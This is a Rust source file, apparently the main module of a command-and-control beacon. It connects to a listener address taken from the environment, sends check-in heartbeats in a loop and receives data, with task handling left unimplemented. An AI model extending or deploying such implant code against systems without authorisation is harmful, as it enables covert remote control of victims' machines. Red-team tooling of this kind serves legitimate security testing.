mod commands;
mod tasks;
mod transport;

use std::{thread, time::Duration};

use transport::{ActiveTransport, Transport};

fn load_transport() -> ActiveTransport {
    ActiveTransport::new()
}

struct Beacon {
    id: String,
    listener_address: String,
}

impl Beacon {
    fn new() -> Self {
        Beacon {
            id: std::env::var("SESSION_ID").expect("no session id provided"),
            listener_address: std::env::var("LISTENER_ADDRESS")
                .expect("no listener address provided"),
        }
    }
}

fn main() {
    let beacon = Beacon::new();

    println!("Beacon Session: {}", beacon.id);
    println!("Server: {}", beacon.listener_address);

    let mut client = load_transport();

    client.connect(&beacon.listener_address).unwrap();

    loop {
        // Send heartbeat / check-in
        println!("Sending heartbeat...");
        if let Err(e) = client.send(beacon.id.as_bytes()) {
            eprintln!("Failed to send heartbeat: {}", e);
        }

        // Receive tasks/response
        match client.receive() {
            Ok(data) => {
                if !data.is_empty() {
                    println!("Received {} bytes", data.len());
                    // TODO: Handle tasks
                }
            }
            Err(e) => {
                eprintln!("Failed to receive data: {}", e);
            }
        }

        // Sleep
        let sleep_time = Duration::from_secs(5);
        println!("Sleeping for {:?}...", sleep_time);
        thread::sleep(sleep_time);
    }
}
